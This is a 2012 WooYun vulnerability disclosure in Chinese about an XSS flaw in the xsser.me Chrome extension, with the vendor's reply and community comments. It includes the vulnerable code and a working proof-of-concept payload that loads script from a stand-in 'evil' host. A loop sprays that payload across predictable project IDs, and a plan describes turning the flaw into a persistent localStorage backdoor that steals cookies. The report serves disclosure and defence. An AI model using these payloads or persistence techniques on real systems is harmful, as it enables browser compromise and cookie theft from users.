{"id": 16548, "wybug_id": "wooyun-2012-013414", "wybug_title": "xsser.me的跨站漏洞", "wybug_corp": "乌云官方", "wybug_author": "p.z", "wybug_date": "2012-10-16 17:31", "wybug_open_date": "2012-11-04 16:50", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-11-04：\t厂商提前公开漏洞，细节向公众公开  简要描述： xsser.me官方提供的chrome插件存在一漏洞，成功利用后，可以在造成在该插件的chrome区的一个xss，通过继承插件的权限，攻击者可以进行进一步攻击，通过进一步的攻击，可以再chrome下留下一个持久的后门，攻击者可以在用户运行浏览器的时候，在任意标签页执行JS代码，获取任意域下的cookie（包括httponly）等等。 详细说明：  对xsser.crx解压popup.html\nfunction render(cookies){\tvar list = document.getElementById('list');\tfor(var i=0,x,html='';x=cookies[i];i++){\t\tx.desc_url=x.url.length>75?x.url.substr(0,75):x.url;\t\thtml+=\"<li><a title=':{url}' href='javascript:void(0)' onclick=\\\"replay(':{url}',':{cookie}')\\\">:{desc_url}</a></li>\"\t\t\t.replace(/:{\\w+}/ig,function(k){return x[k.substring(2,k.length-1)]});\t}\tlist.innerHTML=html;}\nxsser.me提供的api接口虽然对一些特殊字符进行了编码，吧'编码成了&#039;，但是在特定的条件下，&#039;还是会被当成'来对待。如下情况:\n<img src=2 onerror=\"alert(&#039;2')\">\n在本次案例中，cookie被直接带入了onclick=\"replay(':{url}',':{cookie}')\"中，因此可以造成onclick的属性值的js语意截断，执行任意代码。由于发生xss的地方不再是传统的web域，而是在插件处，因此能做的事情也就更多了，关于更多chrome插件安全的科普（http://www.slideshare.net/kkotowicz/advanced-chrome-extension-exploitation）   漏洞证明：  PoC\n(new Image()).src=\"http://xssplatform.sinaapp.com/index.php?do=api&id=92&location=http%3A//www.iana.org/domains/example/&toplocation=http%3A//www.iana.org/domains/example/l&cookie=');(function(){d=document;e=d.createElement('script');e.src='http://evil/xss.js?'%2bMath.random();d.body.appendChild(e);})()//&opener=\";\n由于xsser.me的projectId是可以预测的（递增的数字），因此可以写一段JS代码，对所有的project都发送一个我构造好的payload log\nfor(var i=0; i<100; i++){\t(new Image()).src=\"http://xssplatform.sinaapp.com/index.php?do=api&id=\"+i+\"&location=http%3A//www.iana.org/domains/example/&toplocation=http%3A//www.iana.org/domains/example/l&cookie=');(function(){d=document;e=d.createElement('script');e.src='http://evil/xss.js?'%2bMath.random();d.body.appendChild(e);})()//&opener=\";}\n可以利用下老外写的xss chef（专门搞chrome插件的xss的框架）\n\n但是我们现在的漏洞还是处于一个不完美的状态，因为每一次利用都需要进行一次点击，用简单的话说，我们要把这个反射型xss变成一个存储型xss。插件的功能是这样实现的：加载 -> 获取存储在localStorage中的数据 -> render() -> 隔30s调用load函数 -> load函数去对比xsser.me提供的数据和本地数据，判断是否有新的client上面的render函数直接把desc_url输出，因此他的安全完全取决于外部传入数据（本次案例是xsser.m提供的数据）的安全，如果我们修改localStorage中的数据，render函数输出的html就可以造成xss。下面是我们的思路本次运行时：用户点击 -> 触发xss -> 劫持load函数，并污染本地的localStorage数据。由于劫持了load函数，因此不会再去官方拉取最新的数据，避免了将已经污染的本地localStorage数据再还原。下次运行时，localStorage数据已经是被污染了，render()函数渲染后执行了我们加入的xss payload，xss payload再去劫持load函数，达到rootkit的目的。   修复方案：  1.修复插件中的漏洞。2.xsser.me的projectID变成随机字符串，不可预测。   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-10-19 20:12 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 2012-11-04：漏洞已完全修复  ", "replys": "漏洞评价：\n评论\n     2012-10-16 17:38 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  .......    \n     2012-10-16 17:43 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  @xsser 想夸我就直说    \n     2012-10-16 17:45 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  @p.z  - -    \n     2012-10-16 17:45 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  @p.z 太有想象能力了！又见跨站牛    \n     2012-10-16 17:55 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  xsser想哭了    \n     2012-10-16 17:57 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  = =!! “后门”啊，被发现了吧~    \n     2012-10-16 17:58 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  下午所有项目里弹，截获的一个XX cookies；是洞主杰作吧？    \n     2012-10-16 18:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  各位洞主 安心使用 乌云已经修复了.......    \n     2012-10-16 18:03 |    \t\t江苏苏宁易购电子商务有限公司(乌云厂商)\t\t \n  好鲜亮的标题    \n     2012-10-16 18:03 |    \t\t一刀终情 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:28        | ‮‮PKAV技术宅社区-安全爱好者)\t\t \n  @rayh4c 我艹，原来不是漏洞，是后门    \n     2012-10-16 18:04 |    \t\t波波虎 \t\t\t( 普通白帽子  |\t\t\t        Rank:266 漏洞数:51        | 11111111111)\t\t \n  还好没装，下午刚买的号，就报漏洞了。。。。    \n     2012-10-16 18:05 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @波波虎 怎么买的？！我也想买呢    \n     2012-10-16 18:43 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @一刀终情 我也截获到了!!!    \n     2012-10-16 18:58 |    \t\t波波虎 \t\t\t( 普通白帽子  |\t\t\t        Rank:266 漏洞数:51        | 11111111111)\t\t \n  @zzR  http://www.wooyun.org/market/3 这个里面买    \n     2012-10-16 19:01 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @波波虎 谢谢，已经购买    \n     2012-10-16 19:04 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  被爆菊花了～～    \n     2012-10-16 19:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @gainover 要不要这么多人关注啊    \n     2012-10-16 19:51 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser 哈哈。 说明大家都喜欢菊花～～    \n     2012-10-16 20:37 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  其实反向说明一个东西，就是浏览器插件大家一定要小心。。@xsser 既然修复了，你就忽略吧    \n     2012-10-16 23:24 |    \t\tpangshenjie \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        )\t\t \n  这个屌，围观    \n     2012-10-17 00:35 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  我也收到了~ 受打击了~    \n     2012-10-19 20:43 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  腾讯体。。。。    \n     2012-10-19 21:08 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  这厂商回复要火呀    \n     2012-10-19 23:01 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zzR +1    \n     2012-10-20 08:26 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  开公司了？都有业务部门？    \n     2012-10-20 10:41 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @possible 看下腾讯对漏洞的回复，再看看这个。    \n     2013-01-07 17:23 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  为啥和腾讯的回复一样？    \n     2013-03-09 06:41 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  ............    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}